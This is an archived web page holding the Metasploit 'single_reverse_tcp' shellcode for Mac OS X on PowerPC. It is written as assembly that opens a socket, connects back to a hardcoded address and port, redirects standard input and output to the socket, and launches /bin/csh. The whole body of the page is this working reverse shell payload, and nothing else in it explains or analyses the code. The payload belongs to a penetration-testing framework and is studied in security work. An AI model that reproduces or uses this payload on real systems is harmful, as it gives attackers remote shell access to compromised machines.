<html><head><title>Osx/ppc - Single Reverse TCP</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
;;
;
;        Name: single_reverse_tcp
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore &lt; hdm [at] metasploit.com &gt;
;     Version: $Revision: 1.1 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Connect back and spawn a shell
;
;
;;

.globl _main
.text
_main:
	;; socket
	li      r3, 2
    li      r4, 1
    li      r5, 6
    li      r0, 97
    sc
    xor     r0, r0, r0
    mr      r30, r3

    bl		_connect
    .long 	0x00022211
    .long 	0x7f000001

_connect:
    mflr    r4
    li      r5, 0x10
    li      r0, 98
    mr      r3, r30
    sc
	xor.	r5, r5, r5

_setup_dup2:
	li      r5, 2

_dup2:
    li      r0, 90
    mr      r3, r30
    mr      r4, r5
    sc
    xor     r0, r0, r0
    subi    r5, r5, 1
    cmpwi   r5, -1
    bnel    _dup2

_fork:
    li      r0, 2
    sc
	xor.	r5, r5, r5

_execsh:
    xor.    r5, r5, r5
    bnel    _execsh
    mflr    r3
    addi    r3, r3, 28
    stw     r3, -8(r1)      ; argv[0] = path
    stw     r5, -4(r1)      ; argv[1] = NULL
    subi    r4, r1, 8       ; r4 = {path, 0}
    li      r0, 59
    sc                      ; execve(path, argv, NULL)

; csh removes the need for setuid()
path:
	.ascii  &quot;/bin/csh&quot;
	.long   0x00414243


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
